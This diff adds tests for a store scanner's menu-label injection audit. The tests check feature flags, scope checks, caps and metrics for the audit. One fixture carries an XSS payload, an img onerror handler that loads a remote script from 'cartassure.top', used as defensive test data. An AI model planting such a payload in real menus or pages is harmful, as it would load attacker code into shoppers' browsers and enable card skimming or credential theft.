@@ -191,6 +191,27 @@ vi.mock("../../app/services/redirect-fetcher.server", () => ({
   fetchRedirectsTotal: vi.fn(),
 }));
 
+// gc-7gjj.1: the menu walk is mocked (tests control the items). The detector
+// is a stand-in (scan-engine is mocked here, and the real detector is covered
+// in tests/services/menu-injection-detector.server.test.ts): an item whose
+// title has an onerror handler becomes one finding of the real stored shape.
+vi.mock("../../app/services/menu-fetcher.server", () => ({
+  fetchMenuItems: vi.fn(),
+}));
+vi.mock("../../app/services/menu-injection-detector.server", () => ({
+  detectMenuInjection: (items: Array<{ menuId: string; itemId: string; title: string }>) =>
+    items
+      .filter((item) => item.title.includes("onerror"))
+      .map((item) => ({
+        filename: `menus/${item.menuId}/items/${item.itemId}`,
+        lineNumber: 0,
+        codeSnippet: `Main menu > ${item.title}\nLabel: ${item.title}`,
+        findingType: "MENU_INJECTION",
+        severity: "HIGH",
+        description: "A menu item's label contains code.",
+      })),
+}));
+
 // gc-747u: the worker calls the chunkable pieces. App-pattern detection is
 // mocked (tests control its findings); the bulk tally + bulk findings are the
 // real pure functions, so a chunked walk's bulk detection is exercised for real.
@@ -343,6 +364,7 @@ import {
   detectLiquidErrors,
   extractRenderedLiquidErrors,
 } from "../../app/services/liquid-error-detector.server";
+import { fetchMenuItems } from "../../app/services/menu-fetcher.server";
 import { getMerchantAlertConfigStatus } from "../../app/services/merchant-alert.server";
 import { detectOrphanedMetafields } from "../../app/services/metafield-detector.server";
 import { detectOrphanedPages } from "../../app/services/page-detector.server";
@@ -414,6 +436,7 @@ const mockHasTranslationScope = hasTranslationScope as ReturnType<typeof vi.fn>;
 const mockHasProductScope = hasProductScope as ReturnType<typeof vi.fn>;
 const mockHasContentScope = hasContentScope as ReturnType<typeof vi.fn>;
 const mockHasNavigationScope = hasNavigationScope as ReturnType<typeof vi.fn>;
+const mockFetchMenuItems = fetchMenuItems as ReturnType<typeof vi.fn>;
 
 // Audit fetchers
 const mockAuditTranslations = auditTranslations as ReturnType<typeof vi.fn>;
@@ -615,6 +638,7 @@ beforeEach(() => {
   mockFetchProductAuditData.mockResolvedValue(makeProductAuditData());
   mockFetchPages.mockResolvedValue([]);
   mockFetchRedirects.mockResolvedValue([]);
+  mockFetchMenuItems.mockResolvedValue({ items: [], capped: false });
 
   mockDetectOrphanedProductTags.mockReturnValue([]);
   mockDetectPersistentDiscounts.mockReturnValue([]);
@@ -644,6 +668,7 @@ beforeEach(() => {
   delete process.env.SETTINGS_DRIFT_LIVE_ENABLED;
   delete process.env.APP_EMBED_LIVE_ENABLED;
   delete process.env.APP_INCIDENT_ADVISORY_LIVE_ENABLED;
+  delete process.env.MENU_INJECTION_LIVE_ENABLED;
   // Storefront script-tag audit: dark unless a test enables it. The real
   // fetcher runs; the global fetch is stubbed so no test can reach the network.
   delete process.env.SCRIPT_TAG_SUNSET_LIVE_ENABLED;
@@ -1556,7 +1581,7 @@ describe("scanTheme — consolidated product audit (gc-1bd)", () => {
       expect(typeof meta.phaseMs[key]).toBe("number");
     }
     // Consolidated walk cost is surfaced; redirects contributed nothing here.
-    expect(meta.pageCounts).toEqual({ products: 4, redirects: 0 });
+    expect(meta.pageCounts).toEqual({ products: 4, redirects: 0, menus: 0 });
     expect(meta.throttleSleepMs).toBe(250);
     expect(meta.truncatedWalks).toEqual([]);
   });
@@ -3939,6 +3964,8 @@ describe("scanTheme - liveFindingTypes written at finalize (gc-rvo0)", () => {
     FindingType.LIQUID_ERROR_RENDERED,
     // Affected-app advisory: dark until its first output is reviewed (gc-14x5).
     FindingType.APP_INCIDENT_ADVISORY,
+    // Menu-label injection: dark until its first output is reviewed (gc-7gjj.1).
+    FindingType.MENU_INJECTION,
   ];
   const live = async () => {
     await runScanTheme();
@@ -4000,6 +4027,7 @@ describe("scanTheme - liveFindingTypes written at finalize (gc-rvo0)", () => {
     process.env.APP_EMBED_LIVE_ENABLED = "true";
     process.env.SCRIPT_TAG_SUNSET_LIVE_ENABLED = "true";
     process.env.APP_INCIDENT_ADVISORY_LIVE_ENABLED = "true";
+    process.env.MENU_INJECTION_LIVE_ENABLED = "true";
     expect(await live()).toEqual(Object.values(FindingType));
   });
 
@@ -7175,6 +7203,8 @@ describe("scanTheme — plan-aware product/redirect walks (gc-747u)", () => {
       products: { requestedMax: 603, requestedAvg: 600, actualSum: 600 },
       // Redirects: 2 steps x 20 pages at 52 (the simulated stats count 30 pages).
       redirects: { requestedMax: 52, requestedAvg: Math.round(2080 / 30), actualSum: 60 },
+      // gc-7gjj.1: the menu walk did not run (dark).
+      menus: { requestedMax: 0, requestedAvg: 0, actualSum: 0 },
     });
     expect(signal.metadata.walkThrottleSleepMs).toEqual({ products: 6000, redirects: 14 });
     // The existing combined field is unchanged.
@@ -7772,5 +7802,129 @@ describe("scanTheme — compute-changes step (gc-rrh.4)", () => {
         stripTimings(ok.results[name]),
       ]);
     }
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Menu-label injection audit (gc-7gjj.1)
+// ---------------------------------------------------------------------------
+
+describe("scanTheme — menu-label injection audit (gc-7gjj.1)", () => {
+  const payloadItem = {
+    menuId: "11",
+    menuTitle: "Main menu",
+    itemId: "22",
+    parents: [],
+    title:
+      "Shop<img src=x onerror=\"s=document.createElement('script');s.src='https://cartassure.top/l.js'\">",
+    url: "/collections/all",
+  };
+  const cleanItem = { ...payloadItem, itemId: "23", title: "Sale <b>new</b>" };
+  const finalizeArg = () =>
+    mockFinalizeScan.mock.calls[0][1] as {
+      skippedCategories: string[];
+      cappedCategories: string[];
+      liveFindingTypes: string[];
+    };
+  const menuCreates = () =>
+    mockCreateFindings.mock.calls.filter(([, findings]) =>
+      (findings as Array<{ findingType: string }>).some((f) => f.findingType === "MENU_INJECTION"),
+    );
+
+  it("flag off (default): no menus request, no category, not live", async () => {
+    mockFetchMenuItems.mockResolvedValue({ items: [payloadItem], capped: false });
+
+    await runScanTheme();
+
+    expect(mockFetchMenuItems).not.toHaveBeenCalled();
+    expect(menuCreates()).toEqual([]);
+    expect(finalizeArg().skippedCategories).not.toContain("MENU_INJECTION");
+    expect(finalizeArg().cappedCategories).not.toContain("MENU_INJECTION");
+    expect(finalizeArg().liveFindingTypes).not.toContain("MENU_INJECTION");
+  });
+
+  it("flag on, scope granted: a payload label becomes one HIGH MENU_INJECTION finding", async () => {
+    process.env.MENU_INJECTION_LIVE_ENABLED = "true";
+    mockFetchMenuItems.mockResolvedValue({ items: [cleanItem, payloadItem], capped: false });
+
+    await runScanTheme();
+
+    expect(mockFetchMenuItems).toHaveBeenCalledTimes(1);
+    const [[, findings]] = menuCreates();
+    expect(findings).toEqual([
+      expect.objectContaining({
+        filename: "menus/11/items/22",
+        lineNumber: 0,
+        findingType: "MENU_INJECTION",
+        severity: "HIGH",
+      }),
+    ]);
+    // Idempotent persist: its own type only.
+    expect(mockDb.finding.deleteMany).toHaveBeenCalledWith({
+      where: { scanId: SCAN_ID, findingType: "MENU_INJECTION" },
+    });
+    expect(finalizeArg().skippedCategories).not.toContain("MENU_INJECTION");
+    expect(finalizeArg().liveFindingTypes).toContain("MENU_INJECTION");
+  });
+
+  it("flag on, clean menus: nothing persisted, the type is live (a prior finding can resolve)", async () => {
+    process.env.MENU_INJECTION_LIVE_ENABLED = "true";
+    mockFetchMenuItems.mockResolvedValue({ items: [cleanItem], capped: false });
+
+    await runScanTheme();
+
+    expect(menuCreates()).toEqual([]);
+    expect(finalizeArg().liveFindingTypes).toContain("MENU_INJECTION");
+    expect(finalizeArg().cappedCategories).not.toContain("MENU_INJECTION");
+  });
+
+  it("flag on, navigation scope missing: skipped, no request, never live", async () => {
+    process.env.MENU_INJECTION_LIVE_ENABLED = "true";
+    mockHasNavigationScope.mockResolvedValue(false);
+
+    await runScanTheme();
+
+    expect(mockFetchMenuItems).not.toHaveBeenCalled();
+    expect(finalizeArg().skippedCategories).toContain("MENU_INJECTION");
+    // The redirect audit shares the scope and is skipped with it.
+    expect(finalizeArg().skippedCategories).toContain("GHOST_REDIRECT");
+    // MALICIOUS_SCRIPT is never made un-audited by a missing scope.
+    expect(finalizeArg().skippedCategories).not.toContain("MALICIOUS_SCRIPT");
+    expect(finalizeArg().liveFindingTypes).not.toContain("MENU_INJECTION");
+  });
+
+  it("flag on, a cap hit: capped (prior findings past the cap are not resolved)", async () => {
+    process.env.MENU_INJECTION_LIVE_ENABLED = "true";
+    mockFetchMenuItems.mockResolvedValue({ items: [payloadItem], capped: true });
+
+    await runScanTheme();
+
+    expect(finalizeArg().cappedCategories).toContain("MENU_INJECTION");
+    expect(menuCreates()).toHaveLength(1);
+  });
+
+  it("a failed menus fetch propagates (the step retries, never reads as no menus)", async () => {
+    process.env.MENU_INJECTION_LIVE_ENABLED = "true";
+    mockFetchMenuItems.mockRejectedValue(new Error("[menu-fetcher] Failed to fetch menus: boom"));
+
+    await expect(runScanTheme()).rejects.toThrow(/Failed to fetch menus/);
+    expect(mockFinalizeScan).not.toHaveBeenCalled();
+  });
+
+  it("records the walk's pages and items in scan_signal (counts only)", async () => {
+    process.env.MENU_INJECTION_LIVE_ENABLED = "true";
+    mockFetchMenuItems.mockImplementation(async (_admin: unknown, stats: { pageCount: number }) => {
+      stats.pageCount = 2;
+      return { items: [cleanItem, payloadItem], capped: false };
+    });
+
+    await runScanTheme();
+
+    const [signal] = mockRecordOpsEvent.mock.calls.find(
+      ([event]) => (event as { metadata?: { pageCounts?: unknown } }).metadata?.pageCounts,
+    )!;
+    expect(signal.metadata.pageCounts.menus).toBe(2);
+    expect(signal.metadata.menuItemCount).toBe(2);
+    expect(JSON.stringify(signal.metadata)).not.toContain("cartassure");
   });
 });
